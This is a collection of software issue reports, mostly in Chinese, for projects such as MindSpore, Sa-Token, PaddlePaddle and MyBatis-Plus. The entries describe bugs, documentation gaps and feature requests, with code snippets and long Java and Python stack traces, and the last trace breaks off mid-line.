[CT][MS][doc] The description of RNN and GRU batch_first and seq_length is unclear.,": Ascend GPU /device gpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : https://www.mindspore.cn/docs/api/en/master/api_python/nn/mindspore.nn.GRU.html?highlight=gru#mindspore.nn.GRU https://www.mindspore.cn/docs/api/en/master/api_python/nn/mindspore.nn.RNN.html?highlight=rnn#mindspore.nn.RNN batch_first 、seq_length 描述不清楚 1，batch_first 取值不同时，input和output的shape是不一样的，资料中input的说明了，但output的并没有说明 2，seq_length 这个输入是干什么的？ 输入x 、hx在公式里面有体现， 但 seq_length 没有说明，导致不清楚，为什么要加这个参数。 batch_first 、seq_length 描述的更清楚   <code>: For each element in the input sequence, each layer computes the following function: ht=tanh(Wihxt+bih+Whhh(t?1)+bhh) Here ht is the hidden state at time t, xt is the input at time t, and h(t?1) is the hidden state of the previous layer at time t-1 or the initial hidden state at time 0. If nonlinearity is 'relu', then ReLU is used instead of tanh. Parameters input_size (int) – Number of features of input. hidden_size (int) – Number of features of hidden layer. num_layers (int) – Number of layers of stacked RNN. Default: 1. nonlinearity (str) – The non-linearity to use. Can be either 'tanh' or 'relu'. Default: 'tanh' has_bias (bool) – Whether the cell has bias b_ih and b_hh. Default: True. batch_first (bool) – Specifies whether the first dimension of input x is batch_size. Default: False. dropout (float) – If not 0.0, append Dropout layer on the outputs of each RNN layer except the last layer. Default 0.0. The range of dropout is [0.0, 1.0). bidirectional (bool) – Specifies whether it is a bidirectional RNN, num_directions=2 if bidirectional=True otherwise 1. Default: False. Inputs: x (Tensor) - Tensor of data type mindspore.float32 and shape (seq_len, batch_size, input_size) or (batch_size, seq_len, input_size). hx (Tensor) - Tensor of data type mindspore.float32 and shape (num_directions * num_layers, batch_size, hidden_size). Data type of hx must be the same as x. seq_length (Tensor) - The length of each batch. Tensor of shape (batch_size). Default: None. Outputs: Tuple, a tuple contains (output, h_n). output (Tensor) - Tensor of shape (seq_len, batch_size, num_directions * hidden_size). hx_n (Tensor) - Tensor of shape (num_directions * num_layers, batch_size, hidden_size)."
登录持久化疑问,"使用版本: v1.33.0 登录持久化疑问 1、登录成功之后，调用StpUtil.login(10001)并持久化到了Redis，再使用SaSession保存了用户数据。应用重新启动，这时还是登录状态，但SaSession中的用户数据为空。像这种情况，如何处理？应用重启后，SaSession中的数据也继续保留。 2、SaTokenDao接口实现之后，在哪个地方去调用它？还是不需要去调用它？ 以上这两个set有什么作用？什么时候用到？   <code>: @Override public void set(String key, String value, long timeout) { } @Override public void setObject(String key, Object object, long timeout) { }"
接口存储方案,1、当接口存储配置为时，接口会单独存放在内？还是会在和内都存上？ 2、可否通过magic-api的某些接口实现动态的生成接口内容，比如我现在做一个代码生成工具，不需要写基本的增删改查，就可以动态生成以后存在magic-api对应的位置，然后再UI里看到？   <code>: Redis Redis Redis MySQL
关于PyDataProvider2的使用,"1、求支持原始dataprovider中的StringSlot功能 2、新接口有无getNextBatch()那种可以本地单独调试dataprovider的函数？ 求支持。。 3、一边训练一边测试的时候，如果调用不同的函数，使用不同的字典，新接口用如下使用方式会报错： 求问正确的打开方式   <code>: Traceback (most recent call last): File ""/home/hupeng/.jumbo/lib/python2.7/site-packages/paddle-0.8.0b0-py2.7.egg/paddle/trainer/config_parser.py"", line 3113, in parse_config_and_serialize config = parse_config(config_file, config_arg_str) File ""/home/hupeng/.jumbo/lib/python2.7/site-packages/paddle-0.8.0b0-py2.7.egg/paddle/trainer/config_parser.py"", line 3089, in parse_config execfile(config_file, make_config_environment(config_file, config_args)) File ""PS76.conf"", line 42, in &lt;module&gt; {'dictionary': dict_path}] File ""/home/hupeng/.jumbo/lib/python2.7/site-packages/paddle-0.8.0b0-py2.7.egg/paddle/trainer_config_helpers/data_sources.py"", line 203, in define_py_data_sources2 data_cls=None) File ""/home/hupeng/.jumbo/lib/python2.7/site-packages/paddle-0.8.0b0-py2.7.egg/paddle/trainer_config_helpers/data_sources.py"", line 153, in define_py_data_sources train_args, train_async, data_cls) File ""/home/hupeng/.jumbo/lib/python2.7/site-packages/paddle-0.8.0b0-py2.7.egg/paddle/trainer_config_helpers/data_sources.py"", line 94, in define_py_data_source async_load_data=async)) File ""/home/hupeng/.jumbo/lib/python2.7/site-packages/paddle-0.8.0b0-py2.7.egg/paddle/trainer_config_helpers/data_sources.py"", line 85, in py_data2 data.load_data_object = load_data_object File ""/home/hupeng/.jumbo/lib/python2.7/site-packages/google/protobuf/internal/python_message.py"", line 454, in setter type_checker.CheckValue(new_value) File ""/home/hupeng/.jumbo/lib/python2.7/site-packages/google/protobuf/internal/type_checkers.py"", line 117, in CheckValue raise TypeError(message) TypeError: ['processData', 'processData_test'] has type &lt;type 'list'&gt;, but expected one of: (&lt;type 'str'&gt;, &lt;type 'unicode'&gt;) F1208 13:39:52.866513 24726 PythonUtil.cpp:130] Check failed: (ret) != nullptr Python Error: &lt;type 'exceptions.TypeError'&gt; : ['processData', 'processData_test'] has type &lt;type 'list'&gt;, but expected one of: (&lt;type 'str'&gt;, &lt;type 'unicode'&gt;) Python Callstack: /home/hupeng/.jumbo/lib/python2.7/site-packages/paddle-0.8.0b0-py2.7.egg/paddle/trainer/config_parser.py : 3113 /home/hupeng/.jumbo/lib/python2.7/site-packages/paddle-0.8.0b0-py2.7.egg/paddle/trainer/config_parser.py : 3089 PS76.conf : 42 /home/hupeng/.jumbo/lib/python2.7/site-packages/paddle-0.8.0b0-py2.7.egg/paddle/trainer_config_helpers/data_sources.py : 203 /home/hupeng/.jumbo/lib/python2.7/site-packages/paddle-0.8.0b0-py2.7.egg/paddle/trainer_config_helpers/data_sources.py : 153 /home/hupeng/.jumbo/lib/python2.7/site-packages/paddle-0.8.0b0-py2.7.egg/paddle/trainer_config_helpers/data_sources.py : 94 /home/hupeng/.jumbo/lib/python2.7/site-packages/paddle-0.8.0b0-py2.7.egg/paddle/trainer_config_helpers/data_sources.py : 85 /home/hupeng/.jumbo/lib/python2.7/site-packages/google/protobuf/internal/python_message.py : 454 /home/hupeng/.jumbo/lib/python2.7/site-packages/google/protobuf/internal/type_checkers.py : 117"
【登录失败】 登录失败，密码错误，DaoAuthenticationProvider 密码乱码,"pigx版本: 3.3.0 是否二开: 否 是否修改包名: 否 请查看附件截图 必须提供 <img src=""https://gitee.wang/attachments/b31f7cd4-303d-44af-9d87-3bfaee5a04e2""/> <img src=""https://gitee.wang/attachments/1288dcbe-3cd8-4286-a0c4-885695421000""/> <img src=""https://gitee.wang/attachments/57990d8e-2a11-4689-81e7-f36b5a8e04ef""/> <img src=""https://gitee.wang/attachments/44f000c6-c9c9-4801-b4cb-fbfdcb0e90a2""/> 第一次发工单，还不太熟悉，格式有点乱，不好意思   <code>: ```请查看附件截图"
JWT扩展信息获取失败,"使用版本: 1.29.0 Token已过期 能够正常获取扩展信息 springcloud gateway 作为网关, 路由请求到服务A登录接口 用户登录后 调用 返回token 然后调用接口获取扩展信息 抛出异常 Token已过期. 通过session获取用户对象是正常的. 备注：您提供的信息越充足，我们将越能快速的定位错误   <code>: StpUtil.login(user.getId(), SaLoginConfig.setExtra(""info"", user)); StpUtil.getTokenValue() SysUser loginUser = (SysUser) StpUtil.getExtra(""info"");"
"use paddle.default_main_program() instead of g_main_program, same for g_start_program","The current implementation of will be: This change hides the implementation detail (e.g., using ) from the user, we can change the implementation in the future much easier.   <code>: default_main_program def default_main_program(): return g_main_program g_main_program"
[ST][pynative][MS][NET][gat/gcn/appnp][gpu 1p]RuntimeError: : The pointer[shape] is null,"gat/gcn/appn网络使用pynative模式训练失败 / 硬件环境: /device GPU : -- MindSpore version :r1.8.0 commit_id:762e076e5 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative test_ms_usability_benchmark_pynative_gpu_gcn_time_perf_loss_1p_0001.py test_ms_usability_benchmark_pynative_gpu_gat_time_perf_loss_1p_0001.py test_ms_usability_benchmark_pynative_gpu_appnp_time_perf_loss_1p_0001.py cd solution_test/cases/02network/04gnn/gat/pynative pytest -s test_ms_usability_benchmark_pynative_gpu_gat_time_perf_loss_1p_0001.py 网络训练成功 走给褚金锦   <code>: Traceback (most recent call last): File ""vc_gat_datanet.py"", line 143, in &lt;module&gt; main(args) File ""vc_gat_datanet.py"", line 102, in main train_loss = train_net() File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 602, in __call__ raise err File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 598, in __call__ output = self._run_construct(cast_inputs, kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 417, in _run_construct output = self.construct(*cast_inputs, **kwargs) File ""vc_gat_datanet.py"", line 59, in construct return self.net(self.x, self.y, self.train_mask, self.src_idx, self.dst_idx, self.n_nodes, self.n_edges) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 602, in __call__ raise err File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 598, in __call__ output = self._run_construct(cast_inputs, kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 417, in _run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/wrap/cell_wrapper.py"", line 377, in construct loss = F.depend(loss, self.optimizer(grads)) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 602, in __call__ raise err File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 598, in __call__ output = self._run_construct(cast_inputs, kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/nn/cell.py"", line 417, in _run_construct output = self.construct(*cast_inputs, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 510, in staging_specialize out = _MindsporeFunctionExecutor(func, hash_obj, input_signature, process_obj)(*args) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 94, in wrapper results = fn(*arg, **kwargs) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 327, in __call__ phase = self.compile(args_list, self.fn.__name__) File ""/home/miniconda3/envs/ci/lib/python3.7/site-packages/mindspore/common/api.py"", line 299, in compile is_compile = self._graph_executor.compile(self.obj, compile_args, phase, True) RuntimeError: : The pointer[shape] is null. ---------------------------------------------------- - C++ Call Stack: (For framework developers) ---------------------------------------------------- mindspore/ccsrc/frontend/optimizer/ad/pynative_dfunctor.cc:25 GenNewTensorInner"
Add Estimate Computational Cost for OpWithKernel,We need a interface to i.e. estimate for each OpWithKernel. The API needs to return the number of flop that Op will be performed.   <code>: EstimateComputationalCost flops
[CT][MS][pynative] test_pynative_range_number_is_tensor print error log,"GPU VM+PYNATIVE -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : passed but print some error log No error log   <code>: def test_pynative_range_number_is_tensor(): class Net(Cell, MetaFactory): def __init__(self): super().__init__() MetaFactory.__init__(self) self.add = P.TensorAdd() def construct(self, input): numbers = Tensor(np.arange(2).reshape(1,2).astype(np.int32)) for idx in numbers: print(""-------------"") print(idx) return input input = Tensor(np.array([[1, 2, 7, 42], [3, 4, 54, 22], [2, 2, 55, 3]]), ms.float32) net = Net() net(input)"
【众智】【计算-AICPU接入】DiagPart,"AICPU算子接入 返回张量对角线部分。 x y 对应底层算子 对应底层AI CPU算子DiagPart: @ops.RegisterGradient(""DiagPart"")   <code>: class DiagPart(Primitive):"
表格中的datetime与表单中的datetime并不兼容,"配置项代码如下 经过测试，datetime和date似乎用的是同一个格式化格式，导致如果选择datetime的话，8位字符没有问题，但是14位的话，datetime表单控件完全正常，但是表格里面的格式化就出错。   <code>: [ { type: ""text"", prop: ""name"", label: ""表格名称"" }, { type: ""text"", prop: ""tableName"", label: ""表格中文名称"" }, { type: ""text"", prop: ""recRevisor"", label: ""记录修改责任者"", readonly: true }, { type: ""time"", prop: ""recReviseTime"", label: ""记录修改时刻"", readonly: false, format: ""yyyy-MM-dd HH:mm:ss"", valueFormat: ""yyyyMMddHHmmss"" } ];"
Update the copyright with typos in all files.,Most of the files in the repo at the moment have: instead of I will fix it for all of them.   <code>: All Rights Reserve. All Rights Reserved.
"使用ActiveRecord,进行update操作，提示找不到配置的sql语句（org.apache.ibatis.binding.BindingException: Invalid bound statement (not found): cn.migu.dmp.activiti.dao.ActMonitorConfigDao.selectById）","在oracle库中，使用ActiveRecord,进行update操作，提示找不到配置的sql，inert()正常，但select和update直接异常，换成Mapper方式，同样的结果 异常信息   <code>: ActMonitorConfig actMonitorConfig=new ActMonitorConfig(); actMonitorConfig.setProcdefId(""3333""); actMonitorConfig.setAlertInfo(""llll""); actMonitorConfig.updateById(); @Autowired private ActMonitorConfigDao actMonitorConfigDao; @Test public void getProcdefId() throws Exception { ActMonitorConfig actMonitorConfig=new ActMonitorConfig(); actMonitorConfig.setProcdefId(""3333""); actMonitorConfig.setAlertInfo(""llll""); // actMonitorConfig.selectById(); actMonitorConfigDao.selectById(""3333""); } com.baomidou.mybatisplus.exceptions.MybatisPlusException: java.lang.reflect.InvocationTargetException at com.baomidou.mybatisplus.MybatisSqlSessionTemplate$SqlSessionInterceptor.invoke(MybatisSqlSessionTemplate.java:407) at com.sun.proxy.$Proxy94.update(Unknown Source) at com.baomidou.mybatisplus.MybatisSqlSessionTemplate.update(MybatisSqlSessionTemplate.java:262) at com.baomidou.mybatisplus.activerecord.Model.updateById(Model.java:158) at cn.migu.dmp.activiti.entity.common.ActMonitorConfigTest.getProcdefId(ActMonitorConfigTest.java:28) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:50) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:47) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.springframework.test.context.junit4.statements.RunBeforeTestMethodCallbacks.evaluate(RunBeforeTestMethodCallbacks.java:75) at org.springframework.test.context.junit4.statements.RunAfterTestMethodCallbacks.evaluate(RunAfterTestMethodCallbacks.java:86) at org.springframework.test.context.junit4.statements.SpringRepeat.evaluate(SpringRepeat.java:84) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:325) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:252) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:94) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268) at org.springframework.test.context.junit4.statements.RunBeforeTestClassCallbacks.evaluate(RunBeforeTestClassCallbacks.java:61) at org.springframework.test.context.junit4.statements.RunAfterTestClassCallbacks.evaluate(RunAfterTestClassCallbacks.java:70) at org.junit.runners.ParentRunner.run(ParentRunner.java:363) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.run(SpringJUnit4ClassRunner.java:191) at org.junit.runner.JUnitCore.run(JUnitCore.java:137) at com.intellij.junit4.JUnit4IdeaTestRunner.startRunnerWithArgs(JUnit4IdeaTestRunner.java:68) at com.intellij.rt.execution.junit.IdeaTestRunner$Repeater.startRunnerWithArgs(IdeaTestRunner.java:47) at com.intellij.rt.execution.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:242) at com.intellij.rt.execution.junit.JUnitStarter.main(JUnitStarter.java:70) Caused by: java.lang.reflect.InvocationTargetException at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:497) at com.baomidou.mybatisplus.MybatisSqlSessionTemplate$SqlSessionInterceptor.invoke(MybatisSqlSessionTemplate.java:403) ... 32 more Caused by: org.apache.ibatis.exceptions.PersistenceException: ### Error updating database. Cause: java.lang.IllegalArgumentException: Mapped Statements collection does not contain value for cn.migu.dmp.activiti.dao.ActMonitorConfigDao.updateById ### Cause: java.lang.IllegalArgumentException: Mapped Statements collection does not contain value for cn.migu.dmp.activiti.dao.ActMonitorConfigDao.updateById at org.apache.ibatis.exceptions.ExceptionFactory.wrapException(ExceptionFactory.java:30) at org.apache.ibatis.session.defaults.DefaultSqlSession.update(DefaultSqlSession.java:200) ... 37 more Caused by: java.lang.IllegalArgumentException: Mapped Statements collection does not contain value for cn.migu.dmp.activiti.dao.ActMonitorConfigDao.updateById at org.apache.ibatis.session.Configuration$StrictMap.get(Configuration.java:888) at org.apache.ibatis.session.Configuration.getMappedStatement(Configuration.java:721) at org.apache.ibatis.session.Configuration.getMappedStatement(Configuration.java:714) at org.apache.ibatis.session.defaults.DefaultSqlSession.update(DefaultSqlSession.java:197) ... 37 more"
加了sharding插件后，列表查询使用分页报错,"使用了shardingjdbc之后，分页查询会报错,把startPage注释之后，就不会报错了，但是没有分页。代码如下： 17:47:11.323 [http-nio-8081-exec-25] WARN o.s.w.s.m.m.a.ExceptionHandlerExceptionResolver - [logException,199] - Resolved [org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.exceptions.PersistenceException: Error querying database. Cause: java.lang.ClassCastException: java.lang.String cannot be cast to java.lang.Integer The error may exist in file [D:\ideaSpace\yz\yzzfmanger\yzzf\target\classes\mybatis\yzzf\PostTransDetailOldMapper.xml] The error may involve com.yzzf.project.yzzf.detailOld.mapper.PostTransDetailOldMapper.selectPostTransDetailOldList-Inline The error occurred while setting parameters SQL: SELECT t.id, t.orderid, t.receiver_name, t.receiver_addr, t.receiver_phone, t.weight, t.mail_number, t.internals_type, t.internals_code, t.subtype_num, t.pay_flag, t.pay_money, DATE_FORMAT(t.pay_time,'%Y-%m-%d %H:%i:%s') as pay_time, t.pay_message, t.paytimeout, t.succ_time, t.undo_time, t.send_district, t.send_district_name, t.recv_district , t.recv_district_name , t.amount_money, t.isfree_flag, t.payment_method, t.sender_name, t.sender_idcode, t.sender_phone, t.sender_type, t.principal_idcode FROM post_trans_old t WHERE DATE_FORMAT(t.pay_time,'%Y-%m-%d') &gt;= ? and DATE_FORMAT(t.pay_time,'%Y-%m-%d') &lt;= ? LIMIT ? Cause: java.lang.ClassCastException: java.lang.String cannot be cast to java.lang.Integer]   <code>: at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:96) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:441) at com.sun.proxy.$Proxy81.selectList(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.selectList(SqlSessionTemplate.java:224) at org.apache.ibatis.binding.MapperMethod.executeForMany(MapperMethod.java:147) at org.apache.ibatis.binding.MapperMethod.execute(MapperMethod.java:80) at org.apache.ibatis.binding.MapperProxy$PlainMethodInvoker.invoke(MapperProxy.java:152) at org.apache.ibatis.binding.MapperProxy.invoke(MapperProxy.java:85) at com.sun.proxy.$Proxy255.selectPostTransDetailOldList(Unknown Source) at com.yzzf.project.yzzf.detailOld.service.impl.PostTransDetailOldServiceImpl.selectPostTransDetailOldList(PostTransDetailOldServiceImpl.java:38) at com.yzzf.project.yzzf.detailOld.service.impl.PostTransDetailOldServiceImpl$$FastClassBySpringCGLIB$$19df61e2.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:771) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:749) at org.springframework.aop.aspectj.MethodInvocationProceedingJoinPoint.proceed(MethodInvocationProceedingJoinPoint.java:88) at com.yzzf.framework.aspectj.DataSourceAspect.around(DataSourceAspect.java:47) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethodWithGivenArgs(AbstractAspectJAdvice.java:644) at org.springframework.aop.aspectj.AbstractAspectJAdvice.invokeAdviceMethod(AbstractAspectJAdvice.java:633) at org.springframework.aop.aspectj.AspectJAroundAdvice.invoke(AspectJAroundAdvice.java:70) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:175) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:749) at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:95) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:749) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:691) at com.yzzf.project.yzzf.detailOld.service.impl.PostTransDetailOldServiceImpl$$EnhancerBySpringCGLIB$$60dea67a.selectPostTransDetailOldList(&lt;generated&gt;) at com.yzzf.project.yzzf.detailOld.controller.PostTransDetailOldController.list(PostTransDetailOldController.java:62) at com.yzzf.project.yzzf.detailOld.controller.PostTransDetailOldController$$FastClassBySpringCGLIB$$711fc78c.invoke(&lt;generated&gt;) at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:771) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:749) at org.apache.shiro.spring.security.interceptor.AopAllianceAnnotationsAuthorizingMethodInterceptor$1.proceed(AopAllianceAnnotationsAuthorizingMethodInterceptor.java:82) at org.apache.shiro.authz.aop.AuthorizingMethodInterceptor.invoke(AuthorizingMethodInterceptor.java:39) at org.apache.shiro.spring.security.interceptor.AopAllianceAnnotationsAuthorizingMethodInterceptor.invoke(AopAllianceAnnotationsAuthorizingMethodInterceptor.java:115) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:749) at org.springframework.aop.interceptor.ExposeInvocationInterceptor.invoke(ExposeInvocationInterceptor.java:95) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186) at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:749) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:691) at com.yzzf.project.yzzf.detailOld.controller.PostTransDetailOldController$$EnhancerBySpringCGLIB$$d8f529d8.list(&lt;generated&gt;) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190) at org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138) at org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:105) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:878) at org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:792) at org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87) at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1040) at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:943) at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1006) at org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:909) at javax.servlet.http.HttpServlet.service(HttpServlet.java:652) at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:883) at javax.servlet.http.HttpServlet.service(HttpServlet.java:733) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:61) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AdviceFilter.executeChain(AdviceFilter.java:108) at org.apache.shiro.web.servlet.AdviceFilter.doFilterInternal(AdviceFilter.java:137) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.shiro.web.servlet.ProxiedFilterChain.doFilter(ProxiedFilterChain.java:66) at org.apache.shiro.web.servlet.AbstractShiroFilter.executeChain(AbstractShiroFilter.java:450) at org.apache.shiro.web.servlet.AbstractShiroFilter$1.call(AbstractShiroFilter.java:365) at org.apache.shiro.subject.support.SubjectCallable.doCall(SubjectCallable.java:90) at org.apache.shiro.subject.support.SubjectCallable.call(SubjectCallable.java:83) at org.apache.shiro.subject.support.DelegatingSubject.execute(DelegatingSubject.java:387) at org.apache.shiro.web.servlet.AbstractShiroFilter.doFilterInternal(AbstractShiroFilter.java:362) at org.apache.shiro.web.servlet.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:125) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at com.alibaba.druid.support.http.WebStatFilter.doFilter(WebStatFilter.java:124) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:100) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:93) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:201) at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:119) at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193) at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166) at 